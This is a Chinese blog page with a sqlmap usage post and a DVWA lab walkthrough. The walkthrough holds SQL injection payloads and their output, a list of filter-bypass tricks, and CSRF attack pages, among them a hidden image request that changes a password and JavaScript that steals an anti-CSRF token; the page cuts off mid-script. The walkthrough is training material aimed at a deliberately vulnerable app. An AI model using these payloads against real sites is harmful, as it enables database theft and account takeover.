<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
   
  <meta name="keywords" content="生活,旅行,思考,代码,博客" />
   
  <meta name="description" content="一生努力" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
     0Rld
  </title>
  <meta name="generator" content="hexo-theme-yilia-plus">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/css/style.css">

  
<script src="/js/pace.min.js"></script>


  

  

<link rel="alternate" href="/atom.xml" title="0Rld" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>

</html>
<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
<body>
  <div id="app">
    <main class="content">
      
<section class="cover">
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover3.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">0Rld</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
        <img
          src="/images/ayer.svg"
          class="cover-logo"
          alt="0Rld"
        />
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>

<div id="main">
  <section class="outer">
  <article class="articles">
    
    
    
    
    <article id="post-常见渗透工具的使用" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/02/%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"
    >常见渗透工具的使用</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/02/%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
  <time datetime="2020-04-02T13:26:08.000Z" itemprop="datePublished">2020-04-02</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a><strong>Sqlmap</strong></h2><p>介绍一下sqlmap：sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft  Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p>
<p>sqlmap支持五种不同的注入模式：</p>
<blockquote>
<p><strong>l 基于布尔的盲注</strong>，即可以根据返回页面判断条件真假的注入；</p>
<p><strong>l 基于时间的盲注</strong>，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</p>
<p><strong>l 基于报错注入</strong>，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</p>
<p><strong>l 联合查询注入</strong>，可以使用union的情况下的注入；</p>
<p><strong>l 堆查询注入</strong>，可以同时执行多条语句的执行时的注入。</p>
</blockquote>
<h3 id="输出级别"><a href="#输出级别" class="headerlink" title="输出级别"></a>输出级别</h3><p><strong>参数：-v</strong></p>
<p>Sqlmap的输出信息按从简到繁共分为7个级别，依次为0、1、2、3、4、5和6</p>
<p>使用参数“-v 6”来指定输出级别为6。默认输出级别为1。各个输出级别的描述如下：</p>
<ul>
<li>0：只显示Python的tracebacks信息、错误信息[ERROR]和关键信息[CRITICAL]；</li>
<li>1：同时显示普通信息[INFO]和警告信息[WARNING]；</li>
<li>2：同时显示调试信息[DEBUG]；</li>
<li>3：同时显示注入使用的攻击荷载；</li>
<li>4：同时显示HTTP请求；</li>
<li>5：同时显示HTTP响应头；</li>
<li>6：同时显示HTTP响应体。</li>
</ul>
<p><strong>如果想看到sqlmap发送的测试payload最好的等级就是3</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:10086&#x2F;Less-5&#x2F;?id&#x3D;1&quot;</span><br><span class="line">#获取当前数据库</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:10086&#x2F;Less-5&#x2F;?id&#x3D;1&quot; --current-db</span><br><span class="line"></span><br><span class="line">#获取表</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:10086&#x2F;Less-5&#x2F;?id&#x3D;1&quot; -D  security --tables</span><br><span class="line">#获取字段</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:10086&#x2F;Less-5&#x2F;?id&#x3D;1&quot; -D  security  -T users --columns</span><br><span class="line"></span><br><span class="line">#获取对应字段的值</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1:10086&#x2F;Less-5&#x2F;?id&#x3D;1&quot; -D  security  -T users -C id,password,username --dump</span><br></pre></td></tr></table></figure>





      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" rel="tag">渗透工具</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-DVWA" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/02/DVWA/"
    >DVWA</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/02/DVWA/" class="article-date">
  <time datetime="2020-04-02T06:36:59.000Z" itemprop="datePublished">2020-04-02</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a><strong>SQL Injection</strong></h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a><strong>low</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">&#x2F;&#x2F;输出如下</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: guestbook</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: users</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;爆users的列</span><br><span class="line">1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">ID: 1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: user</span><br><span class="line">ID: 1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: password</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;爆user列和password列的字段内容</span><br><span class="line">1&#39; union select 1,concat(user,password) from users#</span><br></pre></td></tr></table></figure>

<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a><strong>medium</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接爆数据库名和表名                                         末尾加  &amp;&amp;Submit=Submit</span></span><br><span class="line">id=<span class="number">1</span> union select database(),table_name from information_schema.tables where table_schema=database()<span class="comment">#</span></span><br><span class="line"><span class="comment">//查询用户名和对应的密码</span></span><br><span class="line">id=<span class="number">1</span> union select concat(user),concat(password)  from users <span class="comment">##&amp;&amp;Submit=Submit</span></span><br></pre></td></tr></table></figure>

<h3 id="high"><a href="#high" class="headerlink" title="high"></a><strong>high</strong></h3><p>不是很懂这里后面加了limit1 有什么用，注释掉就好了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: id=<span class="number">1</span><span class="string">'  union select concat(user),concat(password)  from users #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br></pre></td></tr></table></figure>

<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a><strong>impossible</strong></h3><p>这个就很有意思了，新手很值得学习，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">'first_name'</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">'last_name'</span> ];</span><br></pre></td></tr></table></figure>

<p>引用<a href="https://blog.csdn.net/qq_45555226/article/details/102884030" target="_blank" rel="noopener">大佬</a>的一张图可以很直观的看到从low到impossible级别所加的防御机制</p>
<img src="/2020/04/02/DVWA/1.png" style="zoom: 67%;">

<p>一般来讲，<strong>is_numeric()</strong> 可以利用16进制绕过，比如 1 or 1=1  &gt;&gt;0x314f52313d31</p>
<p>可以考虑采用<strong>正则表达式</strong>的方法来取代is_numberic函数</p>
<p>一、如果发现一个url可能是注入点之后我们可以尝试手注，但是一般的网站都会过滤一些字符串。</p>
<p>在^没有被过滤的时候可以利用它来测试</p>
<p>异或：xor或^</p>
<p>逻辑运算就是：同真异假（两个条件结果相同就为真，结果不同就为假）</p>
<p>例如：1^0 就是 1 ，1^1 就是 0</p>
<p>例如：?id=1’ ^ (length(‘union’)!=0)–+</p>
<p>如果union被过滤，则后面条件的结果就是假的，前面也是假的，url返回正确</p>
<p>如果union没有被过滤，则后面的条件的结果就是真的，而前面是假的，url返回错误</p>
<p>也可以是?id=1’ ^ (length(‘union’)=5)–+</p>
<p>二、简单的sql绕过</p>
<p>基本关键字：括号、空格、引号、#、=、+、and、or、order、select、union、update、inster、into、delete、outfile……</p>
<p>一些绕过的方法：</p>
<p>1、 大小写混写</p>
<p>2、 使用url编码替换字符 ‘ %27，# %23</p>
<p>3、 十六进制绕过 where=“user” where=0x7573657273</p>
<p>4、使用&amp;&amp; || 代替and or</p>
<p>5、双写关键字 aandnd</p>
<p>6、绕过空格：用tab键代替空格</p>
<p>用回车chr(13)&amp;chr(10)，url编码的形式%0d%0a</p>
<p>用括号 id=1(and)1=1</p>
<p>7、=用like、rlike、等代替</p>
<p>8、使用/<strong>/注释符来，重组关键字 un/</strong>/i/**/on</p>
<p>9、注释负：//，– , /**/, #, –+, – -, ;,%00,–a</p>
<p>如果是使用gbk的网页编码的网站也可以利用宽字节来绕过 </p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br></pre></td></tr></table></figure>

<p> i 表示不区分大小写；<br>       “/[a-zA-Z]/“ &lt;==&gt;”/[a-z]/i”</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a><strong>CSRF</strong></h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p><strong>白盒测试，源码：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">$pass_new = md5( $pass_new );</span><br></pre></td></tr></table></figure>

<p>可以看出，这里只对GET进行了防sql注入，并没防CSRF机制</p>
<p>构造页面test.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://127.0.0.1:12138/vulnerabilities/csrf/?password_new=123123chj&amp;password_conf=123123chj&amp;Change=Change#"</span> border=<span class="string">"0"</span> style=<span class="string">"display:none;"</span> /&gt;</span><br><span class="line">&lt;h1&gt;<span class="number">404</span>&lt;h1&gt;</span><br><span class="line">&lt;h2&gt;file not found&lt;h2&gt;</span><br></pre></td></tr></table></figure>

<p>只要引诱别人点击此，就可成功修改其密码。</p>
<p><strong>黑盒测试：</strong></p>
<p><strong>抓包查看有没有token</strong></p>
<p><strong>如果没有token，直接请求这个页面，不带refer</strong></p>
<p><strong>如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了，这是一个黑盒的挖掘方法</strong></p>
<p>抓包分析，发现有refer</p>
<p>删除refer观察发现返回结果一致</p>
<p>直接构造url，欺骗用户点击即可。</p>
<hr>
<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a><strong>medium</strong></h3><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ) ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn't come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>防CSRF攻击代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ])</span><br></pre></td></tr></table></figure>

<p>解析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eregi(string pattern, string str)：</span><br><span class="line"><span class="comment">#检查str中是否含有pattern（不区分大小写），如果有返回True，反之False。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP超全局变量$_SERVER中的两个值：</span><br><span class="line">$_SERVER[<span class="string">'HTTP_REFERER'</span>]：PHP中获取链接到当前页面的前一页面的url链接地址，即HTTP数据包中的Referer参数的值。</span><br><span class="line">$_SERVER[<span class="string">'SERVER_NAME'</span>]：PHP中获取服务器主机的名称，即HTTP数据包中的Host参数的值。</span><br></pre></td></tr></table></figure>

<p>Referer参数的值，表示来源地址</p>
<p>Host：请求资源所在服务器</p>
<p>这种机制下，就要求来源地址要包含服务器主机地址</p>
<p><strong>绕过方式：</strong></p>
<p>假设攻击服务器主机的域名的域名为：<a href="http://www.chj.com" target="_blank" rel="noopener">www.chj.com</a></p>
<p>攻击者本机域名为：<a href="http://www.ccc.com" target="_blank" rel="noopener">www.ccc.com</a></p>
<p>则只需要将文件名改为<a href="http://www.chj.com" target="_blank" rel="noopener">www.chj.com</a></p>
<p>那么访问的时候refer便是<a href="http://www.ccc.com/www.chj.com" target="_blank" rel="noopener">www.ccc.com/www.chj.com</a></p>
<p>成功包含host，即可绕过。</p>
<p><strong>目前高版本的PHP已经放弃这个函数了，如php5.3</strong></p>
<hr>
<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a><strong>high</strong></h3><p>源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>防护机制：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure>

<p>抓包发现，这个token是随机生成的，所以要想绕过此机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</p>
<p>攻击代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">alert(document.cookie);</span><br><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://www.dvwa.com/vulnerabilities/csrf/'</span>;</span><br><span class="line">    <span class="keyword">if</span>(window.XMLHttpRequest) &#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    xmlhttp.withCredentials = <span class="keyword">true</span>;</span><br><span class="line">    xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xmlhttp.readyState ==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">            <span class="keyword">var</span> regex = /user_token\<span class="string">' value\=\'(.*?)\' \/\&gt;/;</span></span><br><span class="line"><span class="string">            var match = text.match(regex);</span></span><br><span class="line"><span class="string">            console.log(match);</span></span><br><span class="line"><span class="string">            alert(match[1]);</span></span><br><span class="line"><span class="string">                var token = match[1];</span></span><br><span class="line"><span class="string">                    var new_url = '</span>http:<span 